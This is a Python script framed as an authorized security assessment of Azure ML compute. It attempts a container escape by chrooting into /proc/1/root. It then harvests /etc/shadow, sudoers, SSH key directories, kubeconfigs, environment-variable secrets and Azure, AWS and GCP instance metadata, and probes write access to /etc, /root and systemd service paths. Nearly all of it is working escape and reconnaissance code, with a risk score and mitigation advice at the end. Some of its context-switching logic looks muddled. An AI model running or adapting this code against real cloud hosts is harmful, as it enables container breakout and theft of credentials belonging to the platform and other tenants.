#!/usr/bin/env python3
"""
Comprehensive Security Assessment for Azure ML Compute
----------------------------------------------------------------------
This script is designed to run as a non-interactive job on a serverless
Azure ML compute instance. It performs the following steps:
  1. Collects extensive reconnaissance data from inside the container.
  2. Attempts to escape the container by chrooting into /proc/1/root.
  3. If escape is successful, conducts thorough verification of escape.
  4. Collects the same recon data from the host plus additional information.
  5. Attempts to write temporary files to key host directories to test for
     modifiability.
  6. Assesses the practical impact of escape and access levels.
  7. Analyzes Azure ML environment specifics.
  8. Compares the recon data and computes a detailed risk score.
  9. Outputs a comprehensive JSON report with recommendations.

CAUTION: Use this script only in authorized testing environments.
"""

import os
import subprocess
import sys
import json
import socket
import time
import platform
import hashlib
import uuid
import re
from datetime import datetime
from glob import glob
from pathlib import Path

def run_command(command, timeout=10):
    """Execute a shell command and return its output."""
    try:
        result = subprocess.run(
            command, shell=True, check=False,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, timeout=timeout
        )
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {str(e)}"

def check_escape_capabilities():
    """Check if the container has the privileges needed for escape."""
    capabilities = {
        "proc_1_root_access": os.access("/proc/1/root", os.R_OK),
        "cap_sys_admin": "cap_sys_admin" in run_command("capsh --print").lower(),
        "is_root": (os.geteuid() == 0),
        "privileged_mode": "privileged" in run_command("cat /proc/self/status | grep -i seccomp").lower()
    }
    print("[*] Escape Capability Check:")
    for k, v in capabilities.items():
        print(f"    {k}: {v}")
    return capabilities

def attempt_escape():
    """
    Attempt to escape the container by chrooting into /proc/1/root.
    Returns True if successful.
    """
    caps = check_escape_capabilities()
    if not (caps["proc_1_root_access"] and (caps["cap_sys_admin"] or caps["privileged_mode"]) and caps["is_root"]):
        print("[-] Required privileges or access not available for escape.")
        return False

    host_path = "/proc/1/root"
    test_file = os.path.join(host_path, "etc", "os-release")
    if not (os.path.exists(test_file) and os.access(test_file, os.R_OK)):
        print("[-] Cannot access key host file (etc/os-release). Escape aborted.")
        return False

    try:
        print("[*] Attempting chroot escape using /proc/1/root...")
        os.chroot(host_path)
        os.chdir("/")
        print("[+] chroot successful! Now operating in host filesystem context.")
        return True
    except Exception as e:
        print(f"[-] chroot escape failed: {e}")
        return False

def confirm_escape():
    """Performs additional tests to conclusively verify container escape."""
    print("[*] Performing additional verification of container escape")
    confirmations = {}
    
    # Test 1: Check for Docker socket access
    docker_socket = "/var/run/docker.sock"
    docker_access = os.path.exists(docker_socket) and os.access(docker_socket, os.R_OK)
    confirmations["docker_socket_access"] = docker_access
    print(f"    Docker socket access: {docker_access}")
    
    # Test 2: Check for systemd/init process
    init_cmdline = ""
    try:
        with open("/proc/1/cmdline", "rb") as f:
            init_cmdline = f.read().replace(b"\x00", b" ").decode()
    except Exception:
        pass
    confirmations["init_process"] = init_cmdline
    print(f"    Init process cmdline: {init_cmdline}")
    
    # Test 3: Place a marker on the host and verify from container
    marker_id = str(uuid.uuid4())[:8]
    marker_host_path = f"/tmp/host_marker_file_{marker_id}"
    marker_content = f"Escape verification marker: {datetime.now().isoformat()}"
    
    try:
        # Create marker on "host"
        print(f"    Creating marker file on host at {marker_host_path}")
        with open(marker_host_path, "w") as f:
            f.write(marker_content)
        
        # Attempt to read from container context
        # Store current root to return to container context
        old_root = os.open("/", os.O_RDONLY)
        os.chroot(".")  # Reset to container root
        
        container_marker_path = f"/proc/1/root/tmp/host_marker_file_{marker_id}"
        container_marker_content = ""
        
        try:
            print(f"    Attempting to read marker from container context")
            with open(container_marker_path, "r") as f:
                container_marker_content = f.read()
        except Exception as e:
            container_marker_content = f"Error: {str(e)}"
        
        # Return to host context
        os.fchdir(old_root)
        os.chroot(".")
        os.close(old_root)
        
        confirmations["marker_verification"] = {
            "host_content": marker_content,
            "container_read": container_marker_content,
            "matches": marker_content == container_marker_content
        }
        print(f"    Marker verification match: {marker_content == container_marker_content}")
        
        # Clean up marker file
        try:
            os.remove(marker_host_path)
        except Exception:
            pass
    except Exception as e:
        confirmations["marker_verification"] = f"Test failed: {str(e)}"
        print(f"    Marker verification test failed: {e}")
    
    # Test 4: Check for cgroups differences
    host_cgroups = run_command("cat /proc/self/cgroup")
    
    # Return to container to get its cgroups
    old_root = os.open("/", os.O_RDONLY)
    os.chroot(".")  # Reset to container root
    container_cgroups = run_command("cat /proc/self/cgroup")
    
    # Return to host context
    os.fchdir(old_root)
    os.chroot(".")
    os.close(old_root)
    
    cgroup_diff = host_cgroups != container_cgroups
    confirmations["cgroups_comparison"] = {
        "host": host_cgroups,
        "container": container_cgroups,
        "differences_exist": cgroup_diff
    }
    print(f"    Cgroup differences found: {cgroup_diff}")
    
    # Test 5: Check the container ID from inside and outside
    container_id_inside = run_command("cat /proc/self/cgroup | grep -o 'docker/[a-f0-9]*' | head -1 || echo 'Not found'")
    # Go back to host context to get container ID
    old_root = os.open("/", os.O_RDONLY)
    os.chroot(".")
    os.close(old_root)
    container_id_outside = run_command("cat /proc/1/cgroup | grep -o 'docker/[a-f0-9]*' | head -1 || echo 'Not found'")
    # Return to host context
    os.chroot("/proc/1/root")
    
    confirmations["container_id_comparison"] = {
        "inside_container": container_id_inside,
        "from_host": container_id_outside,
        "differs": container_id_inside != container_id_outside
    }
    print(f"    Container ID differs when viewed from host vs. container: {container_id_inside != container_id_outside}")
    
    return confirmations

def enumerate_system_info():
    """Collect basic system information."""
    info = {
        "Kernel & OS Info": run_command("uname -a"),
        "OS Release": run_command("cat /etc/os-release"),
        "Hostname": run_command("cat /etc/hostname"),
        "System Uptime": run_command("cat /proc/uptime"),
        "CPU Info": run_command("cat /proc/cpuinfo | grep 'model name' | head -1"),
        "Memory Info": run_command("free -h"),
        "Disk Usage": run_command("df -h"),
        "Linux Distribution": run_command("lsb_release -a 2>/dev/null || cat /etc/*-release 2>/dev/null"),
        "Current User": run_command("id")
    }
    return info

def enumerate_mounts():
    """Retrieve mounted filesystem details."""
    return run_command("cat /proc/mounts")

def enumerate_sensitive_files():
    """Attempt to read key sensitive files."""
    files_to_check = [
        "/etc/passwd", 
        "/etc/shadow", 
        "/etc/hosts",
        "/etc/resolv.conf",
        "/etc/sudoers",
        "/etc/ssh/sshd_config"
    ]
    sensitive = {}
    for file_path in files_to_check:
        try:
            if os.path.exists(file_path) and os.access(file_path, os.R_OK):
                with open(file_path, "r") as f:
                    sensitive[file_path] = f.read()
            else:
                sensitive[file_path] = "Not accessible"
        except Exception as e:
            sensitive[file_path] = f"Error: {e}"
    return sensitive

def enumerate_network():
    """Collect active network connection information."""
    network_info = {}
    
    # Get networking interfaces with IP
    network_info["interfaces"] = run_command("ip addr show")
    
    # Get routing table
    network_info["routes"] = run_command("ip route")
    
    # Get active connections
    if run_command("which ss"):
        network_info["connections"] = run_command("ss -tulnp")
    else:
        network_info["connections"] = run_command("netstat -tulnp")
    
    # Get DNS configuration
    network_info["dns_config"] = run_command("cat /etc/resolv.conf")
    
    # Check open ports
    network_info["open_ports"] = run_command("netstat -tulnp | grep LISTEN")
    
    return network_info["connections"]  # Keep previous format for compatibility

def enumerate_processes():
    """List running processes."""
    return run_command("ps aux")

def enumerate_logs():
    """Read portions of common log files (limited output)."""
    log_files = [
        "/var/log/auth.log", 
        "/var/log/syslog", 
        "/var/log/messages",
        "/var/log/kern.log",
        "/var/log/azure-ml.log",
        "/var/log/docker.log",
        "/var/log/azure/deploy-script-extension/handler.log"
    ]
    logs = {}
    for log_file in log_files:
        if os.path.exists(log_file) and os.access(log_file, os.R_OK):
            try:
                with open(log_file, "r") as f:
                    logs[log_file] = f.read(1024)  # 1KB limit
            except Exception as e:
                logs[log_file] = f"Error: {e}"
        else:
            logs[log_file] = "Not accessible"
    return logs

def enumerate_docker():
    """Gather Docker container details if available."""
    docker_info = {}
    if run_command("which docker"):
        docker_info["docker_ps"] = run_command("docker ps -a")
        docker_info["docker_images"] = run_command("docker images")
        docker_info["docker_info"] = run_command("docker info")
        
        # Check if docker socket is accessible
        if os.path.exists("/var/run/docker.sock"):
            docker_info["docker_socket"] = "Present and " + ("accessible" if os.access("/var/run/docker.sock", os.R_OK) else "not accessible")
        else:
            docker_info["docker_socket"] = "Not present"
    else:
        docker_info["docker_ps"] = "Docker not installed or not in PATH"
    return docker_info

def enumerate_kubernetes():
    """Enumerate Kubernetes configuration files, if present."""
    k8s_info = {}
    
    if os.path.isdir("/etc/kubernetes"):
        k8s_info["kube_configs"] = run_command("find /etc/kubernetes -type f")
    else:
        k8s_info["kube_configs"] = "Kubernetes configuration directory not found"
    
    # Check for kubeconfig in common locations
    kubeconfig_paths = ["/root/.kube/config", "/home/*/.kube/config", "/var/lib/kubelet/kubeconfig"]
    for path in kubeconfig_paths:
        paths = glob(path)
        if paths:
            k8s_info[f"kubeconfig_{path}"] = "Found"
            if os.access(paths[0], os.R_OK):
                try:
                    with open(paths[0], "r") as f:
                        k8s_info[f"kubeconfig_{path}_content"] = f.read(1024)  # First 1K only
                except Exception as e:
                    k8s_info[f"kubeconfig_{path}_content"] = f"Error: {e}"
    
    # Check for kubelet process
    k8s_info["kubelet_process"] = run_command("ps aux | grep kubelet | grep -v grep")
    
    return k8s_info

def enumerate_cloud_metadata():
    """Check for cloud configuration files and access metadata services."""
    cloud = {}
    
    # Azure specific checks
    cloud["waagent"] = run_command("find /var/lib/waagent -type f") if os.path.isdir("/var/lib/waagent") else "Not found"
    cloud["azure_config"] = run_command("find /etc/azure -type f") if os.path.isdir("/etc/azure") else "Not found"
    cloud["azure_identity"] = run_command("find /var/lib/azure -type f") if os.path.isdir("/var/lib/azure") else "Not found"
    
    # Try to access Azure IMDS
    cloud["azure_metadata"] = run_command("curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'")
    
    # AWS specific checks
    aws = {}
    aws_paths = ["/root/.aws", "/home/*/.aws"]
    for path in aws_paths:
        expanded_paths = glob(path)
        if expanded_paths:
            for p in expanded_paths:
                aws[p] = run_command(f"find {p} -type f")
        else:
            aws[path] = "Not found"
    cloud["aws"] = aws
    
    # Try to access AWS metadata service
    cloud["aws_metadata"] = run_command("curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/")
    
    # GCP specific checks
    gcp = {}
    gcp_paths = ["/root/.config/gcloud", "/home/*/.config/gcloud"]
    for path in gcp_paths:
        expanded_paths = glob(path)
        if expanded_paths:
            for p in expanded_paths:
                gcp[p] = run_command(f"find {p} -type f")
        else:
            gcp[path] = "Not found"
    cloud["gcp"] = gcp
    
    # Try to access GCP metadata service
    cloud["gcp_metadata"] = run_command("curl -s --connect-timeout 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/")
    
    return cloud

def enumerate_sensitive_dirs():
    """Check additional directories that could contain credentials or keys."""
    sensitive_dirs = {}
    
    # SSH keys directories
    ssh_dirs = ["/root/.ssh", "/home/*/.ssh"]
    ssh_results = {}
    for pattern in ssh_dirs:
        dirs_found = glob(pattern)
        if dirs_found:
            for d in dirs_found:
                try:
                    files = os.listdir(d)
                    ssh_results[d] = files
                except Exception as e:
                    ssh_results[d] = f"Error: {e}"
        else:
            ssh_results[pattern] = "Not found"
    sensitive_dirs["ssh_dirs"] = ssh_results

    # Package listings
    if run_command("which dpkg"):  # Debian/Ubuntu
        pkg_list = run_command("dpkg -l")
    elif run_command("which rpm"):  # RHEL/CentOS
        pkg_list = run_command("rpm -qa")
    else:
        pkg_list = "No package manager found"
    sensitive_dirs["package_list"] = pkg_list

    # Crontab files
    crontabs = {}
    crontab_paths = ["/etc/crontab", "/var/spool/cron/crontabs", "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly"]
    for f in crontab_paths:
        if os.path.exists(f):
            if os.path.isdir(f):
                try:
                    crontabs[f] = str(os.listdir(f))
                except Exception as e:
                    crontabs[f] = f"Error: {e}"
            elif os.access(f, os.R_OK):
                try:
                    with open(f, "r") as file:
                        crontabs[f] = file.read()
                except Exception as e:
                    crontabs[f] = f"Error: {e}"
            else:
                crontabs[f] = "Not accessible"
        else:
            crontabs[f] = "Not accessible"
    sensitive_dirs["crontabs"] = crontabs

    # Environment variables
    try:
        sensitive_dirs["environment_vars"] = dict(os.environ)
    except Exception as e:
        sensitive_dirs["environment_vars"] = f"Error: {e}"
    
    # Systemd service files
    if os.path.exists("/etc/systemd/system"):
        try:
            sensitive_dirs["systemd_services"] = os.listdir("/etc/systemd/system")
        except Exception as e:
            sensitive_dirs["systemd_services"] = f"Error: {e}"
    
    # Special Azure ML paths
    azureml_paths = glob("/mnt/azureml/*")
    if azureml_paths:
        azureml_contents = {}
        for path in azureml_paths:
            try:
                azureml_contents[path] = str(os.listdir(path))
            except Exception as e:
                azureml_contents[path] = f"Error: {e}"
        sensitive_dirs["azureml_paths"] = azureml_contents
    
    return sensitive_dirs

def test_write_access(directory):
    """
    Attempts to create and then remove a temporary file in the given directory.
    Returns True if write (and deletion) is successful, False otherwise.
    """
    test_file = os.path.join(directory, f"temp_write_test_{uuid.uuid4().hex}.txt")
    try:
        with open(test_file, "w") as f:
            f.write("write test")
        os.remove(test_file)
        return True
    except Exception as e:
        return False

def check_host_writeability():
    """
    Check if key host directories are writable.
    Returns a dictionary with the results.
    """
    directories = [
        "/etc", 
        "/root", 
        "/mnt/azureml", 
        "/tmp",
        "/var/log",
        "/var/lib",
        "/opt",
        "/home"
    ]
    writable = {}
    for d in directories:
        if os.path.isdir(d):
            writable[d] = test_write_access(d)
        else:
            writable[d] = "Directory not present"
    return writable

def assess_practical_impact():
    """Assess practical impact of the container escape."""
    print("[*] Assessing practical impact of container escape...")
    impact = {}
    
    # Test 1: Can we access other container processes?
    container_id = run_command("cat /proc/self/cgroup | grep -o 'docker/[a-f0-9]*' | head -1 || echo 'Not found'")
    impact["process_access"] = run_command(f"ps aux | grep -v {container_id}")
    print(f"    Other container processes visible: {len(impact['process_access']) > 0}")
    
    # Test 2: Can we modify system services?
    service_test = {}
    systemd_dir = "/etc/systemd/system"
    if os.path.exists(systemd_dir):
        test_service_path = f"{systemd_dir}/security-test-{uuid.uuid4().hex}.service"
        try:
            with open(test_service_path, "w") as f:
                f.write("[Unit]\nDescription=Security Test Service\n\n[Service]\nExecStart=/bin/true\n\n[Install]\nWantedBy=multi-user.target\n")
            service_test["create_service_file"] = True
            os.remove(test_service_path)
            service_test["remove_service_file"] = True
            print(f"    Can create systemd service files: Yes")
        except Exception as e:
            service_test["error"] = str(e)
            print(f"    Can create systemd service files: No ({e})")
    else:
        service_test["systemd_dir"] = False
        print(f"    Can create systemd service files: systemd not found")
    
    impact["service_modification"] = service_test
    
    # Test 3: Network interfaces and routing tables access
    impact["network_interfaces"] = run_command("ip a")
    impact["routing_table"] = run_command("ip route")
    print(f"    Network interfaces accessible: {len(impact['network_interfaces']) > 0}")
    
    # Test 4: Host filesystem traversal and sensitive file access
    sensitive_paths = [
        "/etc/kubernetes",
        "/var/lib/kubelet",
        "/root/.kube/config",
        "/etc/shadow",
        "/root/.ssh",
        "/var/log/azure"
    ]
    
    fs_access = {}
    for path in sensitive_paths:
        if os.path.exists(path):
            try:
                if os.path.isdir(path):
                    fs_access[path] = str(os.listdir(path)[:10])  # List first 10 items only
                    print(f"    Can access {path}: Yes (directory)")
                else:
                    fs_access[path] = "File exists and is " + ("readable" if os.access(path, os.R_OK) else "not readable")
                    print(f"    Can access {path}: Yes (file)")
            except Exception as e:
                fs_access[path] = f"Error: {str(e)}"
                print(f"    Can access {path}: Error ({e})")
        else:
            fs_access[path] = "Path does not exist"
            print(f"    Can access {path}: No (doesn't exist)")
    
    impact["sensitive_path_access"] = fs_access
    
    # Test 5: Check for ability to access kernel modules
    try:
        has_module_access = len(run_command("lsmod")) > 0
        impact["kernel_module_access"] = has_module_access
        print(f"    Can access kernel modules: {has_module_access}")
    except Exception as e:
        impact["kernel_module_access"] = f"Error: {str(e)}"
        print(f"    Can access kernel modules: Error ({e})")
    
    # Test 6: Check if we can run privileged operations
    for cmd in ["iptables -L", "mount", "modprobe"]:
        impact[f"privileged_cmd_{cmd.split()[0]}"] = run_command(cmd)
        print(f"    Can run '{cmd}': {len(impact[f'privileged_cmd_{cmd.split()[0]}']) > 0 and 'permission denied' not in impact[f'privileged_cmd_{cmd.split()[0]}'].lower()}")
    
    return impact

def analyze_azure_ml_environment():
    """Analyze specifics of Azure ML environment."""
    print("[*] Analyzing Azure ML environment specifics...")
    azure_ml = {}
    
    # Look for specific Azure ML paths
    azure_ml["azureml_paths"] = run_command("find /mnt/azureml -type d | head -20")
    print(f"    Azure ML paths found: {len(azure_ml['azureml_paths'].splitlines()) if azure_ml['azureml_paths'] else 0}")
    
    # Check for mounted Azure storage
    azure_ml["storage_mounts"] = run_command("mount | grep azure")
    print(f"    Azure storage mounts found: {len(azure_ml['storage_mounts'].splitlines()) if azure_ml['storage_mounts'] else 0}")
    
    # Look for Azure ML specific environment variables
    ml_env_vars = {}
    azure_related_count = 0
    for var in os.environ:
        if any(x in var.upper() for x in ["AML", "AZUREML", "AZURE", "COMPU", "ML_"]):
            ml_env_vars[var] = os.environ[var]
            azure_related_count += 1
    azure_ml["environment_variables"] = ml_env_vars
    print(f"    Azure ML environment variables found: {azure_related_count}")
    
    # Check if we can access underlying VM metadata
    metadata_url = "http://169.254.169.254/metadata/instance?api-version=2021-01-01"
    curl_cmd = f"curl -s -H 'Metadata: true' {metadata_url}"
    azure_ml["vm_metadata"] = run_command(curl_cmd)
    metadata_accessible = "not found" not in azure_ml["vm_metadata"].lower() and "{" in azure_ml["vm_metadata"]
    print(f"    Azure VM metadata accessible: {metadata_accessible}")
    
    # Check for Azure ML configuration files
    config_files = run_command("find /mnt -name '*.json' | grep -i azure | head -10")
    if config_files:
        azure_ml["config_files"] = config_files
        print(f"    Azure ML config files found: {len(config_files.splitlines())}")
    
    # Check for Azure compute node extensions
    extensions_path = "/var/lib/waagent"
    if os.path.exists(extensions_path):
        try:
            extensions = os.listdir(extensions_path)
            azure_ml["extensions"] = extensions
            print(f"    Azure VM extensions found: {len(extensions)}")
        except Exception as e:
            azure_ml["extensions"] = f"Error: {str(e)}"
            print(f"    Error accessing Azure VM extensions: {e}")
    
    return azure_ml

def gather_all_recon():
    """Aggregate all reconnaissance data."""
    data = {
        "host_info": enumerate_system_info(),
        "mounts": enumerate_mounts(),
        "sensitive_files": enumerate_sensitive_files(),
        "network": enumerate_network(),
        "processes": enumerate_processes(),
        "logs": enumerate_logs(),
        "docker": enumerate_docker(),
        "kubernetes": enumerate_kubernetes(),
        "cloud": enumerate_cloud_metadata(),
        "sensitive_dirs": enumerate_sensitive_dirs(),
        "write_access": check_host_writeability()
    }
    return data

def compare_recon(container_data, host_data):
    """
    Compare selected keys between container and host recon data.
    Returns a dictionary summarizing differences.
    """
    diff = {}
    keys = ["mounts", "sensitive_files", "sensitive_dirs", "docker", "kubernetes", "cloud", "write_access"]
    for key in keys:
        diff[key] = {
            "container": container_data.get(key),
            "host": host_data.get(key)
        }
    return diff

def compute_risk_score(container_data, host_data, escape_success, practical_impact, verification, azure_ml_data):
    """
    Compute a comprehensive risk score based on:
      - Host escape success and verification.
      - Accessibility of sensitive files (/etc/shadow).
      - Exposure of sensitive directories and cloud metadata.
      - Writable host directories.
      - Practical impact assessment.
      - Azure ML environment exposure.
      
    Returns a tuple (score, risk_level, detailed_factors).
    """
    score = 0
    factors = []
    
    # Base score for escape
    if escape_success:
        score += 5
        factors.append("Container escape successful (+5)")
        
        # Additional verification data
        marker_verified = verification.get("marker_verification", {}).get("matches", False)
        if marker_verified:
            score += 2
            factors.append("Container escape verified with bidirectional marker test (+2)")
        
        # Cgroups difference
        cgroups_differ = verification.get("cgroups_comparison", {}).get("differences_exist", False)
        if cgroups_differ:
            score += 1
            factors.append("Host and container cgroups differ (+1)")
    
    # Sensitive file access
    shadow_content = host_data.get("sensitive_files", {}).get("/etc/shadow", "Not accessible")
    if "Not accessible" not in shadow_content and "Error" not in shadow_content:
        score += 5
        factors.append("Access to /etc/shadow from host (+5)")
    
    # Critical writable paths
    write_access = host_data.get("write_access", {})
    writable_count = sum(1 for d in ["/etc", "/root"] if write_access.get(d) is True)
    if writable_count > 0:
        score += (writable_count * 3)
        factors.append(f"Write access to {writable_count} critical host directories (+{writable_count * 3})")
    
    # Sensitive host directories access
    ssh_access = False
    ssh_dirs = host_data.get("sensitive_dirs", {}).get("ssh_dirs", {})
    for path, content in ssh_dirs.items():
        if "Not found" not in str(content) and "Error" not in str(content):
            ssh_access = True
            break
    
    if ssh_access:
        score += 2
        factors.append("Access to SSH keys directories (+2)")
    
    # Cloud metadata accessible
    metadata_accessible = False
    cloud_data = host_data.get("cloud", {})
    
    if "error" not in str(cloud_data.get("azure_metadata", "")).lower() and "{" in str(cloud_data.get("azure_metadata", "")):
        score += 3
        factors.append("Access to Azure IMDS metadata service (+3)")
        metadata_accessible = True
    
    # Practical impact assessment
    impact = practical_impact or {}
    
    # Service creation ability
    if impact.get("service_modification", {}).get("create_service_file", False):
        score += 4
        factors.append("Ability to create systemd service files on host (+4)")
    
    # Network control capabilities
    if "error" not in str(impact.get("network_interfaces", "")).lower() and len(str(impact.get("network_interfaces", ""))) > 50:
        score += 2
        factors.append("Ability to view host network interfaces (+2)")
    
    # Privileged operations
    for cmd in ["iptables", "mount", "modprobe"]:
        cmd_key = f"privileged_cmd_{cmd}"
        if cmd_key in impact and "permission denied" not in str(impact[cmd_key]).lower() and len(str(impact[cmd_key])) > 5:
            score += 2
            factors.append(f"Ability to run privileged command: {cmd} (+2)")
            break  # Count this factor only once
    
    # Access to kubectl or kube-related files
    kube_access = False
    kube_data = host_data.get("kubernetes", {})
    if "not found" not in str(kube_data.get("kube_configs", "")).lower() or "kubeconfig" in str(kube_data):
        score += 3
        factors.append("Access to Kubernetes configuration files (+3)")
        kube_access = True
    
    # Docker socket access for potential lateral movement
    if verification.get("docker_socket_access", False):
        score += 3
        factors.append("Access to Docker socket (+3)")
    
    # Azure ML specific risks
    ml_data = azure_ml_data or {}
    
    # Storage mounts
    if ml_data.get("storage_mounts") and len(str(ml_data.get("storage_mounts"))) > 5:
        score += 2
        factors.append("Access to Azure storage mounts (+2)")
    
    # Environment variables with secrets
    env_vars = ml_data.get("environment_variables", {})
    secret_count = sum(1 for k, v in env_vars.items() if any(secret in k.lower() for secret in ["key", "secret", "token", "password", "pwd"]))
    if secret_count > 0:
        score += 2
        factors.append(f"Access to {secret_count} Azure ML credential environment variables (+2)")
    
    # Determine risk level
    if score >= 12:
        level = "Critical"
    elif score >= 8:
        level = "High"
    elif score >= 4:
        level = "Medium"
    else:
        level = "Low"
    
    return score, level, factors

def get_risk_recommendations(risk_level, factors, escape_success, write_access):
    """Generate detailed recommendations based on risk level and factors."""
    
    recommendations = []
    
    if risk_level == "Critical" or risk_level == "High":
        if escape_success:
            recommendations.append("URGENT: Container escape vulnerability detected. Immediately revoke CAP_SYS_ADMIN capability and disable privileged mode for all containers in this environment.")
        
        if any("Write access to" in factor for factor in factors):
            recommendations.append("CRITICAL: Host filesystem write access detected. Implement proper volume mounts with read-only access and restrict container capabilities.")
        
        if any("Docker socket" in factor for factor in factors):
            recommendations.append("HIGH RISK: Docker socket is accessible from within the container. This allows complete container escape and lateral movement. Remove this mount immediately.")
        
        if any("systemd service" in factor for factor in factors):
            recommendations.append("CRITICAL: Container can create systemd services. This allows persistent backdoors and privilege escalation. Remove CAP_SYS_ADMIN and implement proper seccomp profiles.")
        
        recommendations.append("Apply the principle of least privilege to all containers. Use seccomp, AppArmor or SELinux profiles to restrict container capabilities.")
        recommendations.append("Implement network segmentation between containers and implement runtime security monitoring.")
        
    elif risk_level == "Medium":
        if escape_success:
            recommendations.append("Container escape is possible but with limited impact. Review container capabilities and remove unnecessary privileges.")
        
        recommendations.append("Restrict access to sensitive host paths by implementing proper volume mounts.")
        recommendations.append("Implement network policies to restrict container communications.")
        
    else:  # Low
        recommendations.append("Container security posture appears to be relatively strong, but continuous monitoring is recommended.")
        recommendations.append("Consider implementing runtime security monitoring as a defense-in-depth measure.")
    
    # Azure ML specific recommendations
    if any("Azure" in factor for factor in factors):
        recommendations.append("For Azure ML: Ensure compute instance containers run without privileged access. Use Azure Key Vault for secrets instead of environment variables.")
        recommendations.append("Apply Azure Policy to enforce security controls across all compute instances and use Microsoft Defender for Containers.")
    
    if any("Kubernetes" in factor for factor in factors):
        recommendations.append("If using AKS: Enable Azure Policy for AKS and enforce pod security standards. Implement network policies to restrict pod communications.")
    
    return recommendations

def main():
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    hostname = socket.gethostname()
    
    report = {
        "timestamp": start_time,
        "hostname": hostname,
        "escape_capabilities": {},
        "escape_success": False,
        "container_recon": {},
        "host_recon": {},
        "comparison": {},
        "risk_assessment": {}
    }

    print("====== Comprehensive Azure ML Security Risk Assessment ======")
    print(f"Started at: {start_time}")
    print(f"Hostname: {hostname}")
    print("CAUTION: This script is for authorized security testing only.\n")

    # 1. Gather recon data from inside the container.
    print("[+] Gathering reconnaissance data from inside the container...")
    container_data = gather_all_recon()
    report["container_recon"] = container_data

    # 2. Check escape capabilities
    escape_capabilities = check_escape_capabilities()
    report["escape_capabilities"] = escape_capabilities

    # 3. Attempt container escape via chroot.
    print("\n[+] Attempting container escape via chroot...")
    escape_success = attempt_escape()
    report["escape_success"] = escape_success

    host_data = {}
    verification_data = {}
    practical_impact = {}
    azure_ml_data = {}
    
    if escape_success:
        # 4. Verify the escape
        verification_data = confirm_escape()
        report["escape_verification"] = verification_data
        
        # 5. Gather reconnaissance data from the host
        print("\n[+] Gathering reconnaissance data from the host (post-escape)...")
        host_data = gather_all_recon()
        report["host_recon"] = host_data
        
        # 6. Assess practical impact of the escape
        practical_impact = assess_practical_impact()
        report["practical_impact"] = practical_impact
        
        # 7. Analyze Azure ML environment specifics
        azure_ml_data = analyze_azure_ml_environment()
        report["azure_ml_environment"] = azure_ml_data
    else:
        print("[-] Container escape failed; host reconnaissance not performed.")

    # 8. Compare container and host data.
    report["comparison"] = compare_recon(container_data, host_data)

    # 9. Compute risk score and gather factors
    score, level, factors = compute_risk_score(
        container_data, 
        host_data, 
        escape_success, 
        practical_impact, 
        verification_data, 
        azure_ml_data
    )
    
    # 10. Generate recommendations
    recommendations = get_risk_recommendations(
        level, 
        factors, 
        escape_success, 
        host_data.get("write_access", {})
    )
    
    report["risk_assessment"] = {
        "risk_score": score,
        "risk_level": level,
        "risk_factors": factors,
        "recommendations": recommendations
    }

    # 11. Output the final report.
    print("\n\n===== FINAL SECURITY REPORT =====")
    final_report = json.dumps(report, indent=2)
    print(final_report)

    # 12. Write the report to a file.
    output_file = f"security_report_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    try:
        with open(output_file, "w") as f:
            f.write(final_report)
        print(f"\n[+] Report written to {output_file}")
    except Exception as e:
        print(f"[-] Failed to write report to file: {e}")
        
    # 13. Return to container context if we escaped
    if escape_success:
        try:
            print("\n[+] Returning to container context...")
            old_root = os.open("/", os.O_RDONLY)
            os.chroot(".")
            os.close(old_root)
            print("[+] Successfully returned to container context")
        except Exception as e:
            print(f"[-] Failed to return to container context: {e}")

    print(f"\nAssessment completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Risk Level: {level} (Score: {score})")
    print("Top risk factors:")
    for factor in factors[:5]:  # Show top 5 factors
        print(f"- {factor}")
    
    print("\nKey recommendations:")
    for rec in recommendations[:3]:  # Show top 3 recommendations
        print(f"- {rec}")
    
    print("\nCheck the full report for complete details and recommendations.")

if __name__ == "__main__":
    main()
